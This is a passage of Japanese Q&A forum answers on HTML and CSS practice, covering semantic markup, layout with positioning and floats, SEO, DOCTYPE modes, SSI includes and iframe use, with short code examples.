SEO的にも問題があり、イメージマップやfalshは今は使われなくなりつつあります。 楕円や変形した部分に対してリンクを貼り付けるのはイメージマップが良いですが、ちょっとした工夫が必要です。 　⇒13.6 イメージマップ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　私は、ごく普通のナビゲーションリンクのリストを記述してスタイルシートで行うことがほとんどにしています。 [例] <div class="nav" id="siteMap"> 　<ol> 　　<li><a href="[URL]" title="○や□についてまとめた、なんたらかんたらのページです。">なんたらかんたら</a></li> 　　<li><a href="[URL]" title="○や□についてまとめた、なんたらかんたらのページです。">なんたらかんたら</a></li> ・・・【中略】・・・ 　</ol> </div> とかですかね。 　そのうえで、画像の上にリンクをばら撒いたり、ポインターをあわせると説明が現れたり、時にはサブメニューを横に表示させたり・・・
参考になりませんか？ http://www.drk7.jp/MT/archives/001434.html
こんにちは。 以下のような感じになると思います。 ==== JavaScript $().ready ( function() { $('#lefttop1 a').click ( function() { alert ( $(this).attr('id') ); }); });
　そもそも、HTMLをデザインするために書こうとするから、変なところで躓いてしまうのですよ。 　baseimage.jpgは背景と読み取れますが、もしそうならHTMLに記述する必要はありません。 　ベースとなる画像を-255pxで指定して、その上の画像を-100pxで配置されていますがなぜでしょう。 　position:relativeを使用されていますが、その意味から画像を自在に配置するには不向きだと思います。relativeは相対配置で本来配置されるべき位置から移動します。ここはabsoluteを使用すべきです。 [見直こと] ・そもそもその画像の意味はaltで必ず代替テキストを書いてください。必須です。 ・それはHTMLの文書構造中なんですか？ 　たとえば、図面でしたら <div class="figure"> 　<p><img src="" width="30" height="30" alt="歯車1"></p> 　<p><img src="" width="30" height="30" alt="歯車2"></p> </div> 　とかだけでよいはずです。 　それが判れば、もっとシンプルで判りやすく、先でどのようにも変更できるし・・ <div class="figure"> <p><img src="image1.jpg" width="30" height="30" alt="歯車1"> <p><img src="image2.jpg" width="30" height="30" alt="歯車2"> </div> [CSS] div.figure{width:225px;height:200px;margin:0 auto;position:relative;} div.figure p img{position:absolute;top:50px;left:100px;} div.figure p+p img{top:80px;left:130px;}
検索エンジンの評価は何というキーワードで検索され、どのページが開かれているか、そしてその人数が多いか少ないかというのが大半を占めます。 既に需要のある分野のページであれば特に何もこだわらなくてもページランクはどんどん上がっていきますし、もしそうでなければ長く運営されているページという評価分ぐらいしかランクは上がりません。 ＞検索エンジンの上位に表示させるためにページランクを上げなげればいけないのでは とありますが、検索キーワードと内容が合致しているページということが重要なのであってページランクはあまり関係ありません。 ＞もちろんホームページの内容を充実させなければいけないとは思います。 むしろこれだけちゃんとやっていればニーズのあるジャンルはちゃんと上位に入るようになってきます。 ただし、ジャンルのキーワードでの上位を狙わないようにしましょう。 例えば本に関するレビューサイトを立ち上げたとして、本という検索キーワードで上位に入る可能性は０です。この手のジャンルとしてのキーワードは入れ替わりも激しいですし、かぶるサイトが無数に存在するため載るのは運です。 まず手頃なところだと、サイト名を独特な名前にしておくことです。そうすればかなり高確率でサイト名で検索をかければ1位を狙えます。そして、そのキーワードでアクセスしてくれた人がそのHPのユーザーの数です。 ネットサーフィンをしていて偶然自分のサイトに来るということを期待しているのであればまずはその考えは捨てられたほうが良いと思います。 サイトにアクセスしてもらう人を増やしたいということであれば、何か広告を打ち出さなくては無理でしょう。すみませんがマーケティングに関しては専門外なので、そちらの方はアドバイスできません。 何と言うキーワードで検索してもらいたいのか、自分が何かを調べようと思った時にどういうキーワードで検索するのか、それはジャンルのような競争率の激しい単語ではなく独特なものか、そしてその選別されたキーワードがサイト名やサイト内の文章に書かれているか。とりあえサイトで努力できることはこれぐらいです。
いやはや・・・ HTMLは、 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　点字端末や、携帯電話やスクリーンリーダーで同じ表示？？？なんて無理でしょう。 　HTMLは、文書を読み解き，それを構成する要素(Element)に分解し、それぞれの要素(Element)が何であるかをタグを使ってマークアップする方法です。 　ひとつの段落なら<p></p>で、見出しなら<h1></h1>で、表であるなら<table>で。。。 　どのように表示するかは、HTMLにはまったく関係ありません。スクリーンリーダーでしたら段落前後で一呼吸おくでしょうし、男性の声で読むようにスタイルシートで指定してあれば男声で読み上げられるでしょう。 ★また★ 　W3CのValidatorであっても、本来は段落でないのに、行間を空けるために<p></p>で囲まれていても判断はできないでしょう。 ＞ブラウザは、レンダリングエンジン（TridentやWebkitなど）によって、HTMLの構文違いでちょっとした表示の違いなどを生むと思います。 　これは違います。従来(HTML5より前)のHTMLでは、doctypeによって構文が定められていました。 (例)P要素にはブロック要素を含むことができない。A要素は行内要素しか含むことができない。OLやUL要素にはLI要素を一つ以上持つ・・など 　この構文が誤っている場合のブラウザの処理は定められていませでしが、ブラウザはそのような場合も適当に解釈して構文として成立させてきました。(そうするべきとされていた) 　そのため、その構文解釈がブラウザによって異なっていた 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ 　という限定的な意味です。それをどのようにレンダリングするかとはまったく別の問題です。 ＞そんな中、W3Cという認証がHTMLにはあると思います。 　あくまで、文法上のチェックであって、内容との齟齬までは判断できません。またブラウザがどのように表示するべきかも無関係です。 ＞この認証は100点を取ってればいいと記載されてるかと思いますが、TridentやWebkitなど各種レンダリングエンジンでも大きな違いなくHTMLが表示されるということでしょうか。 　いいえ、典型的な例が、標準モードと互換モードの差です。文書宣言<doctype>とマークアップが正しかったとしても、ブラウザ(特にIE)は、それをどのように表示するかはブラウザの仕様によります。 　⇒doctypeスイッチ - Google 検索( http://www.google.co.jp/#hl=ja&gs_rn=1&gs_ri=hp& … ) 　HTML5では、基本的にDOCTYPEを文書宣言としては用いず、単に標準モードへの切り替えスイッチして用いること。間違った構文をどのように解釈するかも定められていることから、現在の多くのscreenメディアに分類されるブラウザは、標準モードで描画しますから、どのブラウザでも表示の差はなくなると期待されています。--相変わらずIEが足を引っ張ってますが--- ★大事なことは、 1) HTMLではひたすら文書構造だけを正しくマークアップすることだけにすること。 　　W3CのValidatorやAnother HTML-lint( http://www.htmllint.net/html-lint/htmllint.html )では、内容との齟齬は判断できません。 　　すくなくともHTML4.01strictを使用しましょう。transitinalやframesetは使わない。 　　『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 2) プレゼンテーションはスタイルシートにすべて任せること 　　すくなくともCSS2.1がウェブ標準とされていますから、それによって指定すること。 　　IEの場合は、いまだにIE7,8も多く使われているので配慮が必要
imgがインライン要素であることが原因でずれてしまっているのでは、と思います。 スタイルに以下を追加してみてください。 img{ display:block; }
　・ HTMLは、構造化や意味のあるマークアップをする事。 　・ 装飾（配置やデザイン）はHTMLで行うのではなく、CSSでやりましょう。 その１、 <p> ↓ <p style="text-indent:1em;"> その２、 <dl> <dt>団長</dt> <dd>渡哲也</dd> <dt>その他の刑事</dt> <dd><ul><li>神田正輝</li><li>舘ひろし</li></ul></dd> <dt>証言者</dt> <dd><ul><li>菅野美穂</li><li>デヴィ夫人</li></ul></dd> </dl> 配置の調整は、CSSで指定できます。 ------------------ #1の回答やお礼は間違った考え方でしょう。
<center>は非推奨の代表格でHTML4.01strict以降はない要素(HTML5にも当然ない)ですが・・ それはさておいて、 　javascritでソースを書き出しているのですから、その結果のHTMLに対してスタイルを適用させれば良いです。 　firefoxのfirebugアドオンを利用して、表示されるHTMLから、スタイルを適用させたい要素を見つけ出し、それに対して左のスタイルシート編集枠で色々と付け加えてみるのが良いでしょう。
#topの指定があった場合は閉じさせなければいいんですよね？ jQueryは詳しくないので書き方がいいかはわかりませんが、 $('dl.accordion>dd').hide(); の部分を、 ハッシュに#topが指定されてたら実行しない、に変えればいいと思います。 if(location.hash!="#top"){ $('dl.accordion>dd').hide(); }
IE7は環境が無いので試していませんが・・・ 画像だけなら <style> <!-- .box { position:relative; left:50%; } .image { position:relative; right:-100px; } --> </style> <div class="box"> <img src="画像URL" width="100" height="100" class="image"> </div> 前後に文字も入れるなら <style> <!-- .box1 { position:relative; left:50%; } .box2 { border:1px solid #ff0000; /*わかりやすく枠線表示*/ position:relative; right:-100px; display:inline-block; *display:inline; *zoom:1; } --> </style> <div class="box1"> <div class="box2">文字をいれるなら<br /><img src="画像URL" width="100" height="100"><br />こんな感じで</div> </div>
まあ、基本は勉強してもらうとして、道具の方を変えたほうがいいんじゃないでしょうか。 わかりやすいソフトを使うとか、エディタにしても字下げとか色とかサポートしてくれるものを選ぶとか。
グループブログはいかがですか？ ブログもｃｍｓの仲間ですが、専門知識はいりません。自分たちでカスタマイズしたければ必要ですが、オーダーメイドではなく、出来上がったものを使用するだけなら、できると思うのですが？ 少なくとも、このサイトに質問できる人だけがメンバーならできると思います。 詳しくは「グループブログ」で検索してみてください。
最近のスマホは高解像度です今年度中にフルHDの機種も続々と出ます 縦持ちでもよこ1080dotあるわけです よって比較的文字の少ないページなら横のスクロールがないよう ページ毎拡大縮小させて画面にフィットさせるだけでいいです 実際そうしている超大手企業サイトもありますし、最高ではないですがそれで案外困りません あとは沢山文章があるところは文字サイズをインチとかで指定すればいいんじゃないですかね
ゴチャゴチャして見える理由ベスト３は ・多くのブラウザに対応させるやめ冗長 ・１つのファイルに圧縮してまとめてる ・シンプルに見えて実は高機能だから
HTMLの目的は 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より なのです。想定されているのは、パソコンやスマホのようなscreenと呼ばれる端末だけですよね。 　それ以外のユーザーエージェントはiframeに対応していません。もちろん、検索エンジンも対応していません。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから Lynx などのテキスト ブラウザを使用して、サイトを確認します（ほとんどの検索エンジンのスパイダーには Lynx で見えるようにサイトが映ります）。JavaScript、Cookie、セッション ID、フレーム、DHTML、Flash などの特殊な機能が使用されているためにサイトの一部がテキスト ブラウザで表示されない場合、検索エンジンのスパイダーがサイトをうまくクロールできない可能性があります。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［ウェブマスター向けガイドライン - ウェブマスター ツール ヘルプ( http://support.google.com/webmasters/bin/answer. … )］より 　したがってiframeを使用する場合は、 ・サイト内移動のナビゲーションとして使用しない ・重要なコンテンツ--そのページのメインとなる内容は書かない 　あくまで、ブログの一部を紹介するとか、新着情報や本文と関係ない記事を記述するとかになると思います。 　では、サイトマップ的なナビゲーションや、重要な案内などをすべてのページに表示したいときなどはどうするか？？？？、古来--からあるinclude(SSIやPHP)を使えばよいのではないかと・・
#4 です。#3のお礼を読みました。 なるほど、20世紀と21世紀で区切っているのでね。 意味が明確ですし、hr要素を使用していいのではないでしょうか。
ご利用のサーバーがSSI(Server Side Include)認めていれば、単純に <!--#include file="header.html" --> または <!--#include virtual="../header.html" --> です。 　拡張子は.shtmlにしてください。(設定で変更はできます) 画像は、必ずサムネイルにして別ページを作製すると良いでしょう。
きちんとHTMLにして、ブラウザで開くと良いです。 ・Windowsは拡張子で判断しますから、.html としておけばダブルクリックで開きます。 ・ブラウザを起動してファイル→開くと進んでも良いです。 ★HTMLとしては、多くの点で間違いや使用しないほうが良いものが使われています。 1) tableはデザイン、配置目的で使用してはなりません。 　⇒ページレイアウトの目的で表を用いる。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 2)<center><font>は使うべきではありません。 　⇒CENTER要素は、( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　⇒FONT要素とBASEFONT要素は推奨しない。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 3) bordercolorはHTML4.01にはありません。 4) align,bgcolorは使うべきではありません。 　⇒align( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　⇒bgcolor( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 5) cellspacing,cellPaddingはスタイルシートで指定しましょう。 　これらは、ブラウザは理解しますが、著者は使うべきでないと1999年のHTML4.01strictの勧告以来言われ続けてきました。 『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 『推奨しない要素・属性とは、新しい枠組みができたことによって、陳腐化したものを指す。推奨しない要素は、リファレンスマニュアルの各所で定義し、推奨しないことを明記する。推奨しない要素は、HTMLの将来のバージョンでは廃止になる可能性がある。( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　HTML5では、完全に使えなくなります。 ★参考にされている資料がとっても古いか、間違っています。 現状ではHTML4.01strictをお勧めします。下記サイトに初心者向けのとても良いマニュアルがあります。 　⇒はじめてのWebドキュメントづくり( http://www.asahi-net.or.jp/%7Esd5a-ucd/www/ )
普通に戻りますが？--firefox,Opera,Safar,Chromeでは・・ 暫く待ってみたら？ ・・・はっきり言ってIE8のバグです。回避策として、ツールで「互換表示」を選択することですかね。互換表示のリストに加えておくのもよいかも。一番のお勧めはfirefoxなど他のブラウザを使うこと。
＞どうしてもブラウザを伸縮させたときに、divの背景の位置と画像の位置が合わなくなるのです。 　そんなはずありません。 　背景画像は、background-size:で、画像はwidth:height:で指定し、位置は%で指定しますが、background-sizeは後方互換の問題と、縦サイズを決定できない問題のため難しいです。 　そのため、背景にする画像も画像としてマークアップしておき、コンテナブロックの位置・サイズを基準に%で絶対配置すれば良いです。 　 <div class="nav" id="siteMap"> ＿<p><img src="./images/background/ABCD.gif" width="420" height="314" alt=""> ＿<ol> ＿＿<li><a href="A"><img src="./images/A.gif" width="48" height="48" alt="Aへ"></a></li> ＿＿<li><a href="B"><img src="./images/B.gif" width="48" height="48" alt="Bへ"></a></li> ＿＿<li><a href="C"><img src="./images/C.gif" width="48" height="48" alt="Cへ"></a></li> ＿</ol> </div> #siteMap{width:40%;margin:0 auto;padding:0;position:relative;} #siteMap p{margin:0;} #siteMap p img{display:block;width:100%;height:auto;} #siteMap ol,#siteMap ol li{display:block;list-style:none;margin:0;padding:0;width:100%;} #siteMap ol li img{display:block;width:12%;height:auto;position:absolute;} #siteMap ol li a img{top:27.8%;left:4%;} #siteMap ol li a[href="B"] img{left:18%;} #siteMap ol li a[href="C"] img{left:31%;} 　サイズと位置の指定方法のもっとも基本的な部分なので、そのまま基本に忠実に指定していけばよいです。 　⇒10. 視覚整形モデル詳細( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 　難しく考えすぎでは？
なぜ仕様書を見ないの？ 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから BUTTON要素が生成するボタンとINPUT要素が生成するボタンは、機能的には同等だが、 BUTTON要素の方がレンダリング能力が高い。 BUTTON要素は内容を持てる。例えば、画像を内容に持つBUTTON要素の機能は、type属性が"image"のINPUT要素とそっくり同じだが、BUTTON要素型は内容を持てるのだ。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Forms in HTML documents (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 　聞きかじりではなく、正確な情報が得られます。それで判らないときに聞くとよいですよ。
やり方は色々あると思いますが JSでやるなら <form onsubmit="return send( this )"> <input type="number" name="number" value="25"/> <input type="submit" value="send"/> </form> <script> function send( _this ) { var num= _this.number.value; location.href = '25.html'; }; </script> こんな感じでいかがでしょうか
サイト設定を開くと表示されてます。 http://helpx.adobe.com/jp/dreamweaver/using/conn …
３です Operaは問題無く、Firefoxの問題ですが、index.cssの文字コードのせいか、処理されずレイアウトがずれてます(@charset "Shift_JIS";とあるがUTF8で書かれている、wrapBoxを処理できてない) mainContentsとleftContentsが左右にずれるのはクラスのfloatがleftとrightだからです (margin:0;に設定した時、float:left;は左に張り付く、float:right;は右に張り付く） 一番簡単なのは、mainContentsのfloat:right;を解除、margin-leftでLeftContentsの表示スペースを確保し、LeftContents→MainContentsの順にソースを書くことかな？ （自分が作成したサイトはそれで問題が無い） 拡大した時にずれるのは表示した時の画面に入りきらないので下に行ってるだけですが、原因が良くわかりません。div#wrapperにmin-widthを設定していないからかな(所詮素人です） firefoxのツール→Web開発→開発ツールバーをチェックし、Webコンソールや調査を使うといいです(ただし他ブラウザ用のタグもエラーを出すので注意)
これはユーザーインターフェースに関わる部分で基本的には変更すべきではありません。 なぜならsafariを使用しているユーザーは、送信ボタンがどのような形状かを知っているわけですからね。これは他のユーザーインターフェース--ポインターの形状とかスクロールバーの形状と同様、常識として著者が弄らないほうがよいとされています。 　どうしても変更したいなら、input[type="button"]{display:block;border:outset 2px gray;}のように他のタイプに変更してください。 　ですが、決してすべきでないことを理解してくださいね。所詮スタイルシートを理解しないユーザーエージェントには意味ないことですから・・。IE,safari,opera,chromeだけじゃないのですよ。Lynxもあるし点字端末もスクリーンリーダーも・・ 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より
Windowsに頭が犯されていると・・拡張子でなにこれ？ってなってしまいますが、拡張子を含めて一切関係ありません。 　jspは、 　⇒JSPとは【JavaServer Pages】 - 意味/解説/説明/定義 ： IT用語辞典( http://e-words.jp/w/JSP.html ) 　ですが、設定で拡張子は任意のものに変更できます。単にデフォルト値と言うだけです。 　たぶん、JSPを使用して動的に作られているページであることは確実ですが、じゃ「拡張子がhtmlだからJSPじゃないか」といわれると、それはそれはわかりません。 http://hpcgi1.nifty.com/Iruka/ENV_FORM.cgi/test/ … にて、test以下、任意のURLに書き換えてみてください。efg.jpgでもhij.htmでも・・ ※ウェブでは拡張子は関係ありません。単なるファイル名を指示する符号のようなものです。 　Windows以外の他のOSでは、あまり意味のないものです。ディレクトリごとに自在に指定できたりします。
＞これは一体どういう事なのでしょうか？ 基本的にpyoko1017 さんの勘違いです。 デザインビューはプレビューではありません。バージョンが明記されていませんので、定かではありませんが、最近のバージョンではデザインビューのほかにライブビューがあります。確認目的でしたら、そちらの使用をおすすめします。 例えば<table><tr><td>うんあた</td><td>あちゃ</td></tr>><td>さくぁざ</td><td>きじゅ</td></tr></</table> なんてのを視覚的に選ぶとか、wordから書式も引っ張りながら挿入するとか、ショートカットを使って、文章構造を変えていくとか……をやりやすくするために、便宜的にそれっぽく見せているだけで、ブラウザでの表示を再現する機能ではありません。 角丸以外にも沢山、ブラウザ表示と違う表示になります。そういうものなので、反映されることを目指すのは無駄です。
W3Cは「HTML5を標準モードだけで使って欲しい」とはいっていません。 紹介された3つのサイトは全て個人サイトであり、情報の正確性は高くないと思われます。 参考にするなら仕様書もしくは仕様書を策定している団体サイトにしてください。 DOCTYPE宣言とはHTMLのバージョン情報を表すものとして定義されていました。(HTML4.01) http://www.asahi-net.or.jp/~sd5a-ucd/rec-html401 … HTML Standard(通称HTML5)になってバージョンをなくそうという動きがあり、<!DOCTYPE html> に変化したのです。 (ちなみにHTML5からバージョンが廃止されているのでHTML6になってもHTML7になってもHTML Standardのままです。) HTML Standard ではDOCTYPE宣言を廃止したかったそうですが、後述のDOCTYPEスイッチを実装したブラウザが普及した影響で見送ったようです。 ただし、HTML(5)+XML(通称XHTML5)ではDOCTYPE宣言が必須ではありません。 http://www.whatwg.org/specs/web-apps/current-wor … http://www.html5.jp/trans/whatwg_html5faq.html#W … http://oshiete.goo.ne.jp/qa/7390539.html http://oshiete.goo.ne.jp/qa/6874033.html DOCTYPEスイッチは実装(ブラウザ)側の仕様であってHTMLで規定されている仕様にはありません。 当然、実装ごとに仕様が異なります。 http://msdn.microsoft.com/ja-jp/library/cc288325 … https://developer.mozilla.org/ja/docs/Mozilla's_ … HTMLでは元々、バージョン情報を明示するためにDOCTYPE宣言が必須でした。 ブラウザはDOCTYPE宣言を正しく入れることで標準準拠モードとして動作し、HTMLの仕様通りに動作することを期待できます。 Web製作者はクロスブラウザを楽にするために、HTML仕様通りの動作を期待するために、標準準拠モードを好んで使いました。 後方互換モードは特定の古いブラウザ向けに作成したサイトを対象ブラウザの新バージョンでも正常に描画できる為の機能でしかありません。 他のブラウザでの正常動作は期待できないのですから敬遠されて当然だと思います。
空行をあける必要はありません。
class指定が違っているようです。 「pico_leftContents」と「pico_rightContents」がid指定なので、 css div#pico_leftContents { float:left; width:50%;} div#pico_rightContents { float:right; width:50%;} で、できそうな気がします。
古いIEを互換モードで動作させるときに問題があったためでしょうが、今はいずれも考慮しなくて良いので・・・ 　標準モードで動作させればよいでしょう。 　ご存知のように、それぞれのプロパティには継承されるものと継承されないものがあります。bodyの子ブロックが複数あるとき、それらすべてにスタイルを保指定するのは厄介です。 　すくなくとも継承されるプロパティについてはbody要素にスタイルを指定するべきです、また、「基点となるセレクタ」をbodyにすると、階層をきちんと指定できます。これはbody自体にスタイル指定をするのではないですが。 　bodyには、かってbackground,text,(link,vlink,alink)を指定していましたが、これらはbodyに設定すべきでしょう。 body{font-family:;font-size:;color:;background:;line-height:;} など・・ div.header,div.section,div.footer{}よりは楽です。
『残像』の現象が確認できません。 残像が出るのであれば、提示されたコード以外の部分に原因があると思います。 提示されたコードをそのまま使ってもドロップダウンメニューにならないので、 以下のように調整しました。 ul.menu ul { opacity:1; /* 0から1へ変更 */ } /* 追加 */ ul.menu li:hover ul { display: block; } おおよそ期待通り動かないCSSとopacity:0が指定されているという事は、 JavaScriptでドロップダウンを調整しているのでしょうか？（フェードインさせている等） もしそうなら、そのスクリプトに原因があると思います。 -------------------- 構造的には http://oshiete.goo.ne.jp/qa/7862211.html No.1さん自身が書かれた物と全く同じ（olとulの違いのみ）にもかかわらず煩雑とか、 たんに、他人を批判したいだけなので、気にしなくて良いでしょう。
本来はあまりお勧めできる方法ではありません。 それは、googleなどで "frame 問題"-- https://www.google.co.jp/search?q=frame%20%E5%95 … で検索すればたくさん出てきます。 　今回は、単に指定したウェブページがフレームでの表示をキャンセルしているか、ブラウザのセキュリティ制限の可能性があると思います。前者は著作権の問題で、後者はセキュリティの問題です。あたかも金融機関のサイトのようにiframeで該当金融機関のサイトを表示して実は詐欺サイトだったとか・・。これはHTML5以降、URIに対応したたため今後問題になる可能性があります。 　同じサイト内のページをiframeで表示するのは、ユーザーにとってブックマークできないなどの「フレーム問題」を除けば可能ですが、iframeは記事内で自身のブログメニューを表示するなど限定して使うことを考えるべきです。 　そもそも、なんのために入れ子にしたいのかを教えていただければ、includeなどのアドバイスできるかと思います。
>geocities内に存在するファイルはこちらからダウンロードできない？みたいなので 出来ますよ！！ FFFTPのご利用が可能なら http://help.yahoo.co.jp/help/jp/geo/transfer/tra … FTPアクセスを行って、全てのファイル・フォルダーをPCにダウンロード ↓ PCにダウンロードされたファイル・フォルダーを新しいサーバ上にアップロード これで基本的な引越しは完了なのですが geocitiesのアクセスカウンターなどのCGIを利用している場合はページの一部修正が必要
タグは直訳すると「荷札」ですね。 HTMLは、その文書を構成する要素(Element)に分解し、それぞれがその文書にとってどのような要素であるかをマークアップするメタ言語と呼ばれるものです。 　メタ言語とは言語を定義する言語と言うような意味 　ここまで読まれたら解るように、 <a></a>とそれに挟まれた全体が、そのHTMLにおけるa(anchor)要素です。それをタグによってマークアップされているということです。前後の<a>と</a>がタグです。 　hrefは属性(attribute)です。 　とにかく最初に仕様書を通読し、必要に応じていつも参照できるようにしておきましょう。この様な掲示板では断片的な知識しか得られません。 　⇒3.2.1 要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) ★HTML 4.01 仕様書邦訳 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )
A No3です。 たびたび失礼！ どこかで、googleのapi呼び出しが抜けてしまっていました。 <script type='text/javascript' src='http://maps.google.com/maps/api/js?sensor=false' … こちらも念のため。 って、何度もおまぬけなやつ ＞ 俺
確かに便利は良いです。 XMLはご存知のように様々なアプリケーションから利用できる--親和性がよいのですが、XSLTとなるとまだまだ対応したブラウザが多いとは言えず、サーバーサイドでパーサーを使ってXHTMLないしHTMLに変換することになります。 　⇒XML画像データををHTMLで簡単に表示する方法 - HTML - 教えて！goo( http://oshiete.goo.ne.jp/qa/7779854.html ) 　⇒集中連載：IISでXMLを操作する　第1回　IISをXML対応サーバにする( http://www.atmarkit.co.jp/fxml/rensai/iisxml01/i … ) ＞世の中にあるWebサイトの多くはXMLで書かれており、それをHTML（あるいはXHTML）に変換したものなのでしょうか？ 　個人のサイトなら極めて小数でしょう。大規模なサイトでもそんなに多いとは思いません。データベースからPHPなりCGIなどを使用して動的に出力されているほうが多いでしょう。 　ウェブでの公開だけを主眼に置くならHTMLで十分すぎるでしょう。
ブロックレベル要素はわかりやすいイメージでは塊・箱です。前と後で区切られる縦何センチ横何センチと指定できる（しなくてもそう表せるような表現になる）ものです。 ブロックレベル要素と対で説明されるものにインライン要素があります。これは縦何センチ横何センチにはなりません。行内要素とも呼ばれ、行末・行頭に分かれてしまうこともあります。 ブロックレベル要素とインライン要素のわかりやすい表現として「改行が入る」と説明されているのではないでしょうか？独立した塊を表現するのにインライン要素の改行が入らないものと比べて「改行が入る（行が改まる）」と説明しているように思います。 Q：しかし、実際には、前後1行空かないですよね？ 初期値では殆んどの要素がpaddingやmarginなどでインライン要素の改行より開いて見えるように定義されています。cssで空間をつめたりすると空いて見えないですが、インライン要素に比べ改行が入っているように見えることはご理解いただけますでしょうか？ ブロックレベル要素とインライン要素は、基本ですが、中級者でもわかっていない方が多く、性質の違いを知らない故に正しいはずなのに指定が効かないと悩む方を見受けます。例：要素によりセンタリングの仕方が違います。インライン要素ではwidth等は無視されます。 インライン要素「strong・a(href)……」 ブロック…要素「h1・ul・li・table……」 インラインブロック要素「img」（外向きにはインライン要素、自身にはブロック要素となる。imgを文章の途中でも入れることができるが、自身にはwidthなども有効となる。） 参考urlでは、より詳しく説明しています。が、文章を読んでも、図解があっても、対面でも1度や2度の説明では理解されない方も多いです。根気よく挑戦してください。 はやく疑問が解けるといいですね 参考URL：http://mozilla.gr.jp/standards/webtips0015.html
＞それは無理ですね・・・そこから出て行くしか出来ないようになっていますので・・ 　いまどき珍しいですね。 　きちんと更新されるＰＣはプロキシを経由していないか、ことなるプロキシサーバーを使用しているとか？？
<div>の幅は、なにも指定しなければ親要素と同じ幅になりますから、 >100%に変更する以外の方法で 「何も指定しない」というのが正解になるのではないでしょうか？ --------------- >bodyのwidthを1000pxに指定している場合、その範囲を超えて画面上にメニューバーを表示したい >イメージとしては、下記ＵＲＬのような形で、拡大縮小しても、常に画面に100%（画面一杯に）表示されている形です。 前者は100%を越えて表示したい 後者は100%で表示したい と、矛盾しているように思えるのですが。 100%を越えたいのか、100%にしたいのかどちらでしょうか。 1200pxなどと大きな数字を指定すれば、1000px（1000pxの100%）を越えますが。。。
NO.1です。 ”左サイド - メインコンテンツ - 右サイド”の間違いでした。
二重に枠を作って 　※ 外枠に背景を横リピート 　※ 内枠を幅指定＋センターリング（標準モードで） <!-- HTML --> <!DOCTYPE html> <html><body> <div id="header"><div id="header2">ヘッダ</div></div> <div id="content">コンテンツ</div> <div id="footer"><div id="footer2">フッタ</div></div> </body></html> /* CSS */ body{ margin: 0;} #header{ background: url(～～) repeat-x;} #footer{ background: url(～～) repeat-x;} #header2,#content,#footer2{ width:600px; margin: 0 auto; border:1px solid red;} １、上記でも出来るし ２、BODYにheaderの背景画像とし、BODY直下に第二の疑似BODYの外枠（wrapper）を設置しfooterの背景画像でもよい。 その場合は、 background-position: 50% 100%; で最下部に背景画像を。 ３、上記同様にhtmlとbodyに各２つの背景画像って手法もあるし。
#1さんへの追加質問 ＞border-styleを使用して縦線を入れることはできたのですが、 　上記記載のＵＲＬサイトのように、「水色の背景」と「ＨＰ」 　の境目に縦線が入るのではなく、ＨＰを開いたときにＰＣ画面 　上の、一番右端と左端に縦線が入ってしまいます。 成功しています。 ただ、ブロックレベル要素のルールをご存知ないだけです。 つまり、 1.幅を指定しなければ、100％が初期値となるルール。 →だから、右端と左端になります。 2.ブロックレベルの高さを指定しないと中身に合わせて高さが変化するルール。 →中身がないと（実験しただけで中身を入れていない？）高さがないので、上に少しだけという状態になります。中身を増やしてみましょう。高さをheightで指定する方法もありますが、中身がその指定値を超えた時にデザインがおかしくなりますので、お勧めしません。 ＞縦線を入れるために「border-style」はbodyに適応している 　のですが、適応箇所が間違っていると思うのですが、どこに 　適応したらよいのか分かりません。 bodyにでもいいと思いますが、どこに適応したらいいのかは、htmlを見せてもらわないとわかりません。 とりあえずbodyに入れるとして作ってみると <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dt … <html xmlns="http://www.w3.org/1999/xhtml"> <head> <meta http-equiv="Content-Type" content="text/html; charset=shift-jis" /> <title>test</title> <style type="text/css"> html{ background: #D9E5FF;margin:0;/*青の背景色*/ } body{ margin:0 